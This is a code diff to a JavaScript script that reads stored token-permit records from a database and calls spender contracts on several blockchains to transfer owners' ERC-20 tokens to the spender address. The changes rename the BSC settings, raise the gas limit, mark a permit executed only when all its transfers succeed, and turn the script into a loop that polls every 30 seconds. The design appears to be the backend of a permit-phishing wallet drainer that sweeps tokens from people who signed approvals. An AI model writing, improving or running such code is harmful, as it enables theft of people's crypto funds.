@@ -18,8 +18,8 @@ const networkConfig = {
     spenderAddress: process.env.ARBITRUM_SPENDER
   },
   56: { //bsc
-    rpcUrl: process.env.BSC_URL,
-    spenderAddress: process.env.BSC_SPENDER
+    rpcUrl: process.env.BNB_URL,
+    spenderAddress: process.env.BNB_SPENDER
   },
   10: { //optimism
     rpcUrl: process.env.OPTIMISM_URL,
@@ -96,6 +96,8 @@ async function transferTokens() {
         continue;
       }
 
+      let allTransfersSuccessful = true;
+
       for (const detail of validTokens) {
         try {
           const tokenContract = new ethers.Contract(detail.token, erc20Abi, provider);
@@ -114,21 +116,24 @@ async function transferTokens() {
             spenderAddress, // Send to the spender contract (update if different recipient needed)
             amount,
             detail.token,
-            { gasLimit: 100000 }
+            { gasLimit: 600000 }
           );
-          await transferTx.wait();
+          const receipt = await transferTx.wait();
           console.log(`Transfer completed for ${detail.token}: ${transferTx.hash}`);
         } catch (transferError) {
           console.error(`Transfer failed for ${detail.token}:`, transferError);
+          allTransfersSuccessful = false;
           continue;
         }
       }
 
-      await permitsCollection.updateOne(
-        { _id: permitData._id },
-        { $set: { executed: true, executedAt: new Date() } }
-      );
-      console.log(`Transfers marked as executed for owner: ${owner}`);
+      if (allTransfersSuccessful) {
+        await permitsCollection.updateOne(
+          { _id: permitData._id },
+          { $set: { executed: true, executedAt: new Date() } }
+        );
+        console.log(`Transfers marked as executed for owner: ${owner}`);
+      }
     }
   } catch (error) {
     console.error('Transfer failed:', error);
@@ -137,10 +142,22 @@ async function transferTokens() {
   }
 }
 
-transferTokens().then(() => {
-  console.log('Transfer complete');
-  process.exit(0);
-}).catch((error) => {
-  console.error('Script failed:', error);
+async function runContinuously() {
+  console.log('Starting continuous transfer service...');
+  
+  while (true) {
+    try {
+      await transferTokens();
+    } catch (error) {
+      console.error('Error in transfer cycle:', error);
+    }
+    
+    console.log('Waiting 30 seconds before next check...');
+    await new Promise(resolve => setTimeout(resolve, 30000));
+  }
+}
+
+runContinuously().catch((error) => {
+  console.error('Service failed:', error);
   process.exit(1);
 });
